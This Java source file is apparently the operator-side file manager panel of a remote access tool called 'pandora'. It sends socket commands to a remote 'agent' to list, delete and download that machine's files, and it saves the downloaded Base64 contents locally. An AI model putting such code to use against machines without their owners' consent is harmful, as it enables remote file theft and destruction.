package org.pandora.master.scene.impl.agent;


import de.jensd.fx.glyphs.fontawesome.FontAwesomeIcon;
import de.jensd.fx.glyphs.fontawesome.FontAwesomeIconView;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.collections.transformation.FilteredList;
import javafx.geometry.Insets;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import org.controlsfx.control.textfield.CustomTextField;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.data.files.FileData;
import org.pandora.master.utils.TimeUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Objects;
import java.util.Random;
import java.util.stream.Collectors;

public class FileManager {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    private final AgentData agentData;
    private final ArrayList<String> waiting;
    private final Master master;
    private final ControllerBuilder controllerBuilder;
    private final TableView<FileData> tableView;
    private final ObservableList<FileData> observableList;
    private final FilteredList<FileData> filteredList;
    private final TableColumn<FileData, String> locationColumn;
    private final TableColumn<FileData, String> nameColumn;
    private final TableColumn<FileData, String> dateColumn;
    private final Random random;
    private final Label pathLabel;
    private boolean waitingList;
    private String path;

    public FileManager(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.random = new Random();
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.waiting = controllerBuilder.getWaiting();
        this.tableView = (TableView<FileData>) this.builderManager.getTableViewBuilder().buildTableView("No result found OR waiting for files...", Color.WHITE, 16, 456, 969, 0, 54, "agent-fileManager-tableView");
        this.observableList = FXCollections.observableArrayList();
        this.filteredList = new FilteredList(this.observableList);
        this.locationColumn = (TableColumn<FileData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Location", 320, "location");
        this.nameColumn = (TableColumn<FileData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Name", 320, "name");
        this.dateColumn = (TableColumn<FileData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Creation Date", 320, "date");
        this.path = "default";
        this.waitingList = false;
        this.pathLabel = this.builderManager.getLabelBuilder().buildLabel("Path | " + this.path, 27, 511, Color.rgb(230, 230, 230), "Consolas", 13);
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Lite File Manager | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 20, 52, 949, 52);

        final FontAwesomeIconView fontAwesomeIconView = new FontAwesomeIconView(FontAwesomeIcon.SEARCH);
        fontAwesomeIconView.setFill(Color.rgb(118, 119, 135));
        fontAwesomeIconView.setSize("15");

        final CustomTextField searchField = new CustomTextField();
        searchField.setTranslateX(667);
        searchField.setTranslateY(14);
        searchField.setPrefWidth(250);
        searchField.setPrefHeight(25);
        searchField.setPromptText("Search...");
        searchField.setLeft(fontAwesomeIconView);
        searchField.textProperty().addListener((obs, oldValue, newValue) -> this.filteredList.setPredicate(fileData -> {
            final String value = newValue.toLowerCase().trim();
            return fileData.getLocation().toLowerCase().contains(value) || fileData.getName().toLowerCase().contains(value) || fileData.getDate().toLowerCase().contains(value);
        }));

        searchField.setId("searchField");
        fontAwesomeIconView.setId("searchFontAwesomeIcon");

        this.tableView.setItems(this.filteredList);
        this.tableView.getColumns().setAll(this.locationColumn, this.nameColumn, this.dateColumn);
        this.tableView.requestLayout();

        final Button refreshButton = this.builderManager.getButtonBuilder().buildButton(null, "Refresh", 866, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-fileManager-refresh");
        final Button backButton = this.builderManager.getButtonBuilder().buildButton(null, "Back", 27, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-fileManager-back");

        backButton.setOnAction(event -> {
            if (!this.waitingList) {
                if (!this.path.equals("default")) {
                    this.path = this.path.length() > 3 ? Paths.get(this.path).getParent().toString() : "default";
                    this.sendRequest("list", this.path);
                }
            }
        });
        refreshButton.setOnMouseClicked(event -> this.sendRequest("list", this.path));
        this.tableView.setOnMousePressed(event -> {
            if (event.isPrimaryButtonDown() && event.getClickCount() == 2) {
                final FileData selectedItem = this.tableView.getSelectionModel().getSelectedItem();
                if (selectedItem != null) {
                    final FileData fileData = Objects.requireNonNull(selectedItem);
                    final String fileName = fileData.getName();
                    if (fileName.startsWith("[Dir] ") || fileName.startsWith("Local Disk")) {
                        this.path = fileData.getLocation();
                        this.sendRequest("list", this.path);
                    }
                }
            }
        });
        this.sendRequest("list", this.path);

        this.createContextMenu();
        this.anchorPane.getChildren().addAll(line, this.tableView, defaultLabel, refreshButton, searchField, this.pathLabel, backButton);
    }

    private void createContextMenu() {
        final ContextMenu contextMenu = new ContextMenu();

        final MenuItem open = new MenuItem("Open (Folder)", null);
        final MenuItem delete = new MenuItem("Delete (File)", null);
        final MenuItem download = new MenuItem("Download (Folder/File)", null);

        contextMenu.getItems().addAll(open, delete, download);

        delete.setOnAction(event -> this.sendRequest("delete", Objects.requireNonNull((TableRow<FileData>) contextMenu.getOwnerNode()).getItem().getLocation()));
        download.setOnAction(event -> this.sendRequest("download", Objects.requireNonNull((TableRow<FileData>) contextMenu.getOwnerNode()).getItem().getLocation()));
        open.setOnAction(event -> {
            final FileData fileData = Objects.requireNonNull((TableRow<FileData>) contextMenu.getOwnerNode()).getItem();
            final String fileName = fileData.getName();
            if (fileName.startsWith("[Dir] ") || fileName.startsWith("Local Disk")) {
                this.path = fileData.getLocation();
                this.sendRequest("list", this.path);
            }
        });

        this.tableView.setRowFactory(tableView -> {
            final TableRow<FileData> row = new TableRow<>();
            row.setOnContextMenuRequested(event -> {
                if (!row.isEmpty()) contextMenu.show(row, event.getScreenX(), event.getScreenY());
            });
            return row;
        });
    }

    private void sendRequest(final String request, final String path) {
        if (!this.waitingList && !path.equals("No result")) {
            this.waitingList = true;
            final String id = request + "-" + TimeUtils.getRandomId();
            if (request.equals("list")) {
                this.pathLabel.setText("Path | " + this.path);
                this.observableList.clear();
                this.master.getFileManager().deleteAll(this.agentData.getId());
            }
            this.waiting.add(id);
            this.master.getSocketUtils().write(this.agentData.getId(), "fileManager:" + request + ":" + id + ":" + path.replace("#", "(hashtag)").replace(":", "(doubleDot)"));
        }
    }

    public void receiveRequest(final String type, final String requestId, final String data, String response, String fileName) {

        if (this.waiting.contains(requestId) && this.waitingList) {
            if (fileName != null) fileName = fileName.replace("(hashtag)", "#").replace("(doubleDot)", ":");
            switch (type) {
                case "list": {
                    this.observableList.clear();
                    this.master.getFileManager().deleteAll(this.agentData.getId());
                    final String[] fileSplit = response.split("#");
                    for (int i = 0; i < this.count(response, '#'); i++) {
                        final String[] valueSplit = fileSplit[i].split(":");
                        final FileData fileData = new FileData(valueSplit[0].replace("(doubleDot)", ":").replace("(hashtag)", "#"), valueSplit[1].replace("(doubleDot)", ":").replace("(hashtag)", "#"), this.formatDate(valueSplit[2].replace("(doubleDot)", ":").replace("(hashtag)", "#")));
                        this.master.getAgentManager().getAgentData(this.agentData.getId()).getFiles().add(fileData);
                        this.observableList.add(fileData);
                    }
                    this.tableView.setItems(this.filteredList);
                    break;
                }
                case "delete": {
                    response = response.replace("(hashtag)", "#").replace("(doubleDot)", ":");
                    final String finalResponse = response;

                    if (Boolean.parseBoolean(data)) {
                        this.master.getFileManager().deleteAll(finalResponse);
                        this.master.getNotification().notify("File deletion", "Successfully deleted " + finalResponse);
                        this.observableList.removeAll(this.observableList.stream().filter(fileData -> fileData.getLocation().equals(finalResponse)).collect(Collectors.toList()));
                    } else {
                        this.master.getNotification().notify("File deletion", "Error while deleting " + finalResponse);
                    }
                    break;
                }
                case "download": {
                    try {
                        if (response.endsWith("An error occurred"))
                            this.master.getNotification().notify("Lite File Manager", "(Agent) Error while downloading " + fileName);
                        else if (response.endsWith("No content."))
                            this.master.getNotification().notify("Lite File Manager", "(Agent) No content was found in " + fileName);
                        else {
                            final File folder = new File(this.master.getFileUtils().getValue("download"));
                            if (!folder.exists()) folder.mkdirs();
                            final File file = new File(folder.getAbsolutePath() + "\\" + this.random.nextInt(Integer.MAX_VALUE) + "_" + fileName);
                            final byte[] byteArray = Base64.getDecoder().decode(response);
                            final FileOutputStream outFile = new FileOutputStream(file);
                            outFile.write(byteArray);
                            outFile.close();
                            this.master.getNotification().notify("Lite File Manager", file.exists() ? "File saved at " + file.getAbsolutePath() : "(Master) Error while downloading " + fileName);
                        }
                    } catch (final IOException ioException) {
                        this.master.getNotification().notify("Lite File Manager", "(Master) Error while downloading " + fileName + " - " + ioException.getMessage());
                    }
                    break;
                }
            }

            this.waitingList = false;
            this.waiting.remove(requestId);
        }
    }

    private String formatDate(final String date) {
        if (date.equals("No result")) return date;
        final String[] split = date.split("T");
        final String[] dateSplit = split[0].split("-");
        return split[1].split("\\.")[0] + " - " + dateSplit[2] + "/" + dateSplit[1] + "/" + dateSplit[0];
    }

    private int count(final String string, final char c) {
        int count = 0;
        for (int i = 0; i < string.length(); i++) if (string.charAt(i) == c) count++;
        return count;
    }
}


